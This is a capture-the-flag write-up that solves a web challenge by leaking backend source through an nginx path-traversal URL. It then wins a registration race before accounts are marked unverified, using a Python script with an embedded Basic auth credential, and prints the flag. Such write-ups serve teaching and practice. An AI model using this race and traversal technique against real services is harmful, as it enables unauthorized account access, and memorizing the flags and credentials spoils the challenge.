# Equestria - Shadow Realm

| Titel          | Kategorie | flag | Difficulty |
| :---        |    :----   |:--- |  :--- |
| Equestria - Shadow Realm | Web Exploitation and Binary Exploitation  | SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght} | medium (2 filled stars) |

## Description
The secret website is protected by a login page. Can you find a way to get in?

## Attachments
The website is hosted on http://exp.cybergame.sk:7000/.
Also nginx.conf
(Follow-up challenge to [Equestria - Door To The Stable](Equestria_-_Door_To_The_Stable.md)

http://exp.cybergame.sk:7000/images../secretbackend/db.js
http://exp.cybergame.sk:7000/images../secretbackend/index.js

## Solution

I first tried to register and then login after that, but I was told the `The Dark Council has not approved you yet` so I checked out the code of the register endpoint:

```javascript
app.post("/api/register", async (req, res) => {
  try {
    const { username, password, email } = req.body;

    const { rows } = await dbAsync.query(
      "INSERT INTO users (username, password, email) VALUES ($1, $2, $3) RETURNING id",
      [username, password, email]
    );

    const userId = rows[0].id;
    await sendEmailToAdministrator(userId, username);

    await dbAsync.query("UPDATE users SET verified = false WHERE id = $1", [
      userId,
    ]);

    return res.json({
      success: true,
      message:
        "Welcome to the Dark Stable. The Council will judge your worthiness.",
    });
  } catch (err) {
    if (err.constraint === "users_username_key") {
      return res.status(400).json({ error: "Username already exists" });
    }
    res.status(500).json({ error: "Registration failed", msg: err.message });
  }
});
```
I found that the endpoint automatically sets the `verified` column to `false` after registration. I also found that the `sendEmailToAdministrator` function is not yet implemented properly and just waits for 1 second before returning. So this means if I register, I should be able to login within 1 second, while the `verified` flag is not yet set to `false` so I wrote a little script to automate the process:

```javascript
async function sendEmailToAdministrator(userId, username) {
  // TODO: Implement email sending. We'll just sleep until then.
  await sleep(1000);
  console.log(`đź¦„ Dark Council notified about new subject: ${username}`);
  return true;
}
```

```python
import requests
import threading
import time

url = "http://exp.cybergame.sk:7000/secretbackend"
auth_header = {"Authorization": "Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9"}

def register():
    data = {
        "username": "race_winner",
        "password": "racepass123",
        "email": "race@winner.com"
    }
    return requests.post(f"{url}/api/register", json=data, headers=auth_header)

def login(session):
    data = {
        "username": "race_winner",
        "password": "racepass123"
    }
    for _ in range(10):
        resp = session.post(f"{url}/api/login", json=data, headers=auth_header)
        if "token" in resp.cookies:
            print(f"Success! Token: {resp.cookies['token']}")
            print(f"Response: {resp.json()}")
            return True
    return False

session = requests.Session()
register_thread = threading.Thread(target=register)
register_thread.start()

time.sleep(0.8)

if login(session):
    notes = session.get(f"{url}/api/notes")
    print(f"Notes: {notes.json()}")

    secret = session.get(f"{url}/api/secret-note")
    print(f"Secret note: {secret.text}")
else:
    print("Attack failed - try adjusting the timing")
```

This produced the following response:

```
Response: {'success': True, 'welcome_msg': 'Access granted. The light has no power here. You walk the path of the unseen, where only those who understand the night may tread. Tread carefully, for even the darkness has its watchers… SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght}'}
```

The flag is `SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght}`.